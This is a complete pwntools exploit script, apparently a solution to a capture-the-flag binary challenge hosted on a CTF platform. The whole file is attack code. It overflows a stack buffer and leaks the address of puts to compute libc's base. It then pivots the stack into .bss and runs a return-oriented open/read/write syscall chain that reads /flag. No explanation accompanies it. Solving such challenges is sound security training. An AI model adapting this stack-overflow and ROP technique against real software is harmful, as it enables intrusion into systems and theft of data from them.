from pwn import *
import sys
remote_addr = ["node5.buuoj.cn",26726]
libc = ELF('./libc.so.6')
elf = ELF('./pwn')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./pwn_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 1

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

#debug('''
#3    b *0x40143d
#''')

pop_rdi = 0x401381
main = 0x401386
bss_addr = 0x404800
leave_ret = 0x401349
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
payload = b'a' * (0x20) + p64(0) + b'a' * (0x10) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)
s(payload)
libc.address = u64(ru(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']
pr('libc.address', libc.address)
pop_rsi = libc.address + 0x2be51
pop_rdx = libc.address + 0x796a2
pop_rax = libc.address + 0x45eb0
xor_rax = libc.address + 0xbaaf9
syscall_ret = libc.address + 0x91316
o = libc.sym['open']
r = libc.sym['read'] + 4
w = libc.sym['write']

payload = b'a' * (0x20) + p64(0) + p64(bss_addr) * 2 + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss_addr) + p64(pop_rdx) + p64(0x200) + p64(xor_rax) + p64(syscall_ret) + p64(leave_ret) + p64(0)
pause()
s(payload)
payload = b'/flag\x00\x00\x00' + flat(pop_rdi, bss_addr, pop_rsi, 0, pop_rax, 2, syscall_ret, pop_rdi, 3, pop_rsi, bss_addr + 0x120, pop_rdx, 0x100, pop_rax, 0, syscall_ret, pop_rdi, 1, pop_rsi, bss_addr + 0x120, pop_rdx, 0x100, pop_rax, 1, syscall_ret)
pause()
s(payload)

shell()
